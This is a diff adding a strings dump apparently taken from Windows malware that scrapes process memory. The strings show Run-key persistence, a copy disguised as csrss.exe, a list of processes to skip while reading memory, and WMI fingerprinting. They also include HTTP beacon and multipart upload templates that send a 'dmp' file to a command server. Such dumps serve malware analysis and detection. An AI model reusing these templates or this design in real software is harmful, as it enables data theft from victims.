@@ -1,0 +1,167 @@
+0x40143cL %u.%u.%u
+0x401474L c:\
+0x4014abL -%X.
+0x4014feL .
+0x40154bL SOFTWARE\Microsoft\Windows\CurrentVersion
+0x40155bL ProductId
+0x4015b8L SOFTWARE\Microsoft\Windows NT\CurrentVersion
+0x4015c8L ProductId
+0x401678L _%X%X
+0x401870L wsock32.dll
+0x40188bL wsock32.dll
+0x4018a2L __WSAFDIsSet
+0x4018b7L WSAStartup
+0x4018ccL send
+0x4018e1L socket
+0x4018f6L gethostbyname
+0x40190bL connect
+0x401920L closesocket
+0x401935L select
+0x40194aL recv
+0x401ae0L SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+0x401af7L csrss
+0x401b48L %s "%s"
+0x401cbcL .com
+0x401ce9L .org
+0x401d13L .net
+0x401d39L .ru
+0x401d53L .in
+0x40208bL %X%X
+0x402184L Name
+0x402194L Description
+0x402204L Model
+0x402214L Size
+0x402259L SKU
+0x402269L Model
+0x40229bL %s-%s-%s-%s
+0x4022f0L \csrss.exe
+0x402360L \csrss.exe
+0x4023abL \csrss.exe
+0x402a23L \dmsnf.cfg
+0x402c2fL GET /index.php HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 10.0; DSNF_%u=%s=)
+Connection: Keep-Alive
+Host: %s
+
+
+
+0x402cb9L <!-
+0x402df7L +++++++++++++++++++++++++++7ac103214023
+0x402e0eL --%s
+Content-Disposition: form-data; name="userfile[]"; filename="dmp"
+Content-Type: application/octet-stream
+
+
+
+0x402e2cL POST /indexu.php HTTP/1.1
+Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; DSNF_%u=%s=)
+Content-Type: multipart/form-data; boundary=%s
+Host: %s
+Content-Length: %u
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+
+
+0x402f7bL 
+--%s--
+
+
+0x403018L <!-OK->
+0x40309cL LocalFree
+0x4030b1L GetCurrentProcessId
+0x4030c6L Module32First
+0x4030dbL GetTickCount
+0x4030f0L GetFileSize
+0x403105L WriteFile
+0x40311aL Process32First
+0x40312fL LoadLibraryA
+0x403144L DeleteFileA
+0x403159L GetWindowsDirectoryA
+0x40316eL OpenProcess
+0x403183L ReadProcessMemory
+0x403198L CreateProcessA
+0x4031adL CreateFileA
+0x4031c2L LocalAlloc
+0x4031d7L Process32Next
+0x4031ecL CloseHandle
+0x403201L CopyFileA
+0x403216L CreateToolhelp32Snapshot
+0x40322bL GetModuleHandleA
+0x403240L SetFilePointer
+0x403255L ReadFile
+0x40326aL VirtualQueryEx
+0x403292L #KHALMNPR.EXE#LBTWiz.exe#ati2evxx.exe#atiesrxx.exe#atieclxx.exe#TrueSuiteService.exe#TrueService.exe#ibmpmsvc.exe#RtHDVCpl.exe#tpfnf6r.exe#LVOSDSVC.exe#TPOSDSVC.exe#TPONSCR.exe#TpScrex.exe#TPHKSVC.exe#tpnumlkd.exe#tpnumlk.exe#ctfmon.exe#msiexec.exe#wdfmgr.exe#wscntfy.exe#SynTPHelper.exe#SynTPEnh.exe#smss.exe#csrss.exe#winlogon.exe#spoolsv.exe#taskmgr.exe#wininit.exe#nvvsvc.exe#btwdins.exe#GoogleUpdate.exe#lsass.exe#LogonUI.exe#hkcmd.exe#wuauclt.exe#igfxpers.exe#igfxsrvc.exe#igfxext.exe#jusched.exe#patch.exe#rthdcpl.exe#mobsync.exe#MsMpEng.exe#msseces.exe#sidebar.exe#internat.exe#WmiPrvSE.exe#SLsvc.exe#kadxmain.exe#SkyTel.exe#realsched.exe#reader_sl.exe#nvxdsync.exe#nvsvc32.exe#ntrtscan.exe#ETDService.exe#HeciServer.exe#ETDCtrl.exe#ETDCtrlHelper.exe#
+0x40330bL VMware
+0x403332L audio
+0x403359L Apple
+0x403380L License
+0x4033a7L FontCache
+0x4033ceL Touch
+0x4033f5L icon
+0x40341cL torrent
+0x403443L Phone
+0x40346aL Tray
+0x403491L Icon
+0x4034b8L FlashPlayer
+0x4034dfL movie
+0x403506L vmware
+0x40352dL tray
+0x403554L video
+0x40357bL Torrent
+0x4035a2L sound
+0x4035c9L Skype
+0x403611L #
+0x403683L 32\Dwm.exe
+0x4036aaL 32\TpShocks.exe
+0x4036d1L \pwrmgrv\
+0x4036f8L \Audio
+0x40371fL \Video
+0x403746L \Movie
+0x40376dL Audio\
+0x403794L Video\
+0x4037bbL Movie\
+0x4037e2L \Apple
+0x403809L \iPod\
+0x403830L \DVD
+0x403857L \QuickTime\
+0x40387eL \Foxit Software\
+0x4038a5L \K-Lite C
+0x4038ccL Games\
+0x4038f3L Player\
+0x40391aL \Windows Defender\
+0x403941L \DAEMON Tools
+0x403968L \Synaptics\
+0x40398fL \Roxio\
+0x4039b6L \Adobe\
+0x4039ddL \Lenovo\
+0x403a00L \ThinkPad\
+0x403bbeL 
+
+=====[ 
+0x403be4L  ]=( 
+0x403c0eL  )=====
+
+
+
+0x403d1dL advapi32.dll
+0x403d38L advapi32.dll
+0x403d4fL RegCloseKey
+0x403d64L RegSetValueExA
+0x403d79L LookupPrivilegeValueA
+0x403d8eL RegCreateKeyExA
+0x403da3L OpenProcessToken
+0x403db8L AdjustTokenPrivileges
+0x403dfcL kernel32.dll
+0x403e11L GetProcAddress
+0x403e2cL CreateThread
+0x403e87L \dmp.tmp
+0x403ea7L SeDebugPrivilege
+0x401db7L ROOT\CIMV2
+0x401e47L WQL
+0x402174L SELECT * FROM Win32_Processor
+0x4021c9L SELECT * FROM Win32_ComputerSystemProduct
+0x4021f4L SELECT * FROM Win32_DiskDrive
+0x402249L SELECT * FROM Win32_BaseBoard
